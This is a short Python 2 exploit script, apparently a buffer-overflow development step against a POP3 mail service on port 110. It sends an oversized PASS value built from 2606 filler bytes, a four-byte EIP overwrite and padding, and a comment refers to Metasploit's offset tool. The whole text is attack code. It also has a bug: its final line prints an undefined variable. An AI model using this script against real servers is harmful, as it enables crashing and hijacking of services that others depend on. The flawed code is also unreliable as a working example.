#!/usr/bin/env python

import socket, time

junk = 2606 * "\x41"  # /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 39694438 (39694438 is EIP address)
eip = 4 * "\x42"
padding = 400 * "\x43"
payload = junk + eip + padding
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.103", 110))
print s.recv(1024)
s.send("USER christopher" + "\r\n")
print s.recv(1024)
s.send("PASS " + payload + "\r\n")
print s.recv(1024)
print "%s bytes data has been sent" % len(pattern)
s.close()
